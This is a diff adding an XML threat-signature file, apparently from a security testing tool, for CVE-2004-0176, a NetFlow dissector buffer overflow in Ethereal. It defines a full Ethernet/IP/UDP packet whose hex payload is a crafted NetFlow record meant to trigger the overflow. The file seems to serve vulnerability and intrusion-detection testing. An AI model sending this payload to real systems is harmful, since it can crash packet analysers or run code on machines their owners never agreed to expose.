@@ -1,0 +1,71 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="Ethereal Netflow Dissector Buffer Overflow"/>
+    <EngDesc display="true" value="There is a buffer overflow in the NetFlow dissector within Ethereal, a program that is used to capture and dissect network packets. It is possible for a remote attacker to execute arbitrary code in the context of the ROOT or LOCAL_SYSTEM user."/>
+    <Intent display="true"/>
+    <Protocol display="true" value="UDP"/>
+    <Type_Of_Equipment display="true">
+      <item value="Application"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="General_Vvlnerability"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="General_Vvlnerability_General_Vvlnerability_Ethereal"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true"/>
+    <Credit display="true" value="FSC20040401-03"/>
+    <CVEID display="true" value="CVE-2004-0176"/>
+    <bugtraqID display="true" value="9952"/>
+    <OSVDB display="true" value=""/>
+    <Author display="true" value="ThreatEx Team"/>
+    <ID display="true" value="b37ea963dd9ab7c78bf07874d3483389"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value="true"/>
+    <ServerSideAttack display="true" value=""/>
+    <SoftwareRevision display="true" value="2.0"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value="false"/>
+    <Valid_Traffic display="false" value="True"/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value=""/>
+    <Authentication display="false" value=""/>
+    <ConfImpact display="false" value=""/>
+    <IntegImpact display="false" value=""/>
+    <AvailImpact display="false" value=""/>
+    <ImpactBias display="false" value="normal"/>
+    <FirstAdded display="false" value="normal"/>
+    <LastModified display="false" value="633602640555156250"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value="B"/>
+    <SigProtocol display="false" value=""/>
+    <Rate display="false" value="1"/>
+    <Regex display="false" value=""/>
+    <Created value="1213725119" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="B"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="C"/>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv4Address" value="null" index="D"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="E"/>
+    <NamedVar name="destPort" type="ImperfectControls.Port" value="null" index="F"/>
+  </Variables>
+  <Loops>
+    <for index="A">
+      <for index="B"/>
+      <for index="C"/>
+      <for index="D"/>
+      <for index="E"/>
+      <for index="F"/>
+    </for>
+  </Loops>
+  <PostScript/>
+  <Output index="A" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="0157" Identification="927D" FragmentOffset="0000" TTL="80" Protocol="11" HeaderChecksum="90A6" srcIP="$sourceIP" destIP="$destIP" options="" CE="false" DF="false" MF="false">
+        <UDP srcPort="@random(1026,65535)" destPort="$destPort" checksum="0" length="" Payload="00090001010203040A0B0C0D0100000000000101000001240001004700000001000A000000000001000A000000000001000A000000000001000A000000000001000A000000000001000A000000000001000A000000000001000A000000000001000A000000000001000A000000000001000A000000000001000A000000000001000A000000000001000A000000000001000A000000000001000A000000000001000A000000000001000A000000000001000A000000000001000A000000000001000A000000000001000A000000000001000A000000000001000A000000000001000A000000000001000A000000000001000A000000000001000A000000000001000A000000000001000A000000000001000A000000000001000A000000000001000A000000000001000A000000000001000A000000000001000A00"/>
+      </IP>
+    </Ethernet>
+  </Output>
+</threatSignature>
